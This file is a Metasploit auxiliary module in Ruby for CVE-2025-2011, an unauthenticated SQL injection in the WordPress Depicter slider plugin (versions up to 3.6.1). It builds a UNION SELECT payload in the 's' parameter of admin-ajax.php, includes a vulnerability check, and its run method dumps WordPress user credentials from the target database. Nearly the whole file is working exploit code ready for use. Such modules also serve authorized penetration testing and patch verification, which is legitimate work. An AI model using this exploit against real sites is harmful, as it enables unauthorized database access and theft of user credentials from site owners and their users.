##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Depicter Plugin SQL Injection (CVE-2025-2011)',
        'Description' => %q{
          The Slider & Popup Builder by Depicter plugin for WordPress <= 3.6.1
          is vulnerable to unauthenticated SQL injection via the 's' parameter
          in admin-ajax.php.
        },
        'Author' => [
          'Muhamad Visat',     # Vulnerability Discovery
          'Valentin Lobstein'  # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2011'],
          ['WPVDB', '6f894272-3eb6-4595-ae00-1c4b0c0b6564'],
          ['URL', 'https://cloud.projectdiscovery.io/library/CVE-2025-2011'],
          ['URL', 'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L179']
        ],
        'Actions' => [
          ['SQLi', { 'Description' => 'Perform SQL Injection via admin-ajax.php?s=' }]
        ],
        'DefaultAction' => 'SQLi',
        'DefaultOptions' => {
          'VERBOSE' => true,
          'COUNT' => 1
        },
        'DisclosureDate' => '2025-05-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
      Opt::RPORT(80)
    ])
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      expr = payload.to_s.strip.gsub(/\s+/, ' ')
      r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
      injected = "#{r1}') UNION SELECT #{r2},#{r3},(#{expr}),#{r4},#{r5}-- -"

      endpoint = normalize_uri('wp-admin', 'admin-ajax.php')
      params = {
        'action' => 'depicter-lead-index',
        's' => injected,
        'perpage' => rand(10..50).to_s,
        'page' => rand(1..3).to_s,
        'orderBy' => 'source_id',
        'order' => ['ASC', 'DESC'].sample,
        'dateStart' => '',
        'dateEnd' => '',
        'sources' => ''
      }
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => endpoint,
        'vars_get' => params
      )
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200

      extracted = res.get_json_document.dig('hits', 0, 'content', 'id')
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG if extracted.to_s.empty?

      extracted
    end
  end

  def check
    @sqli = get_sqli_object
    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable

    Exploit::CheckCode::Safe
  end

  def run
    @sqli ||= get_sqli_object
    wordpress_sqli_initialize(@sqli)
    wordpress_sqli_get_users_credentials(datastore['COUNT'])
  end
end
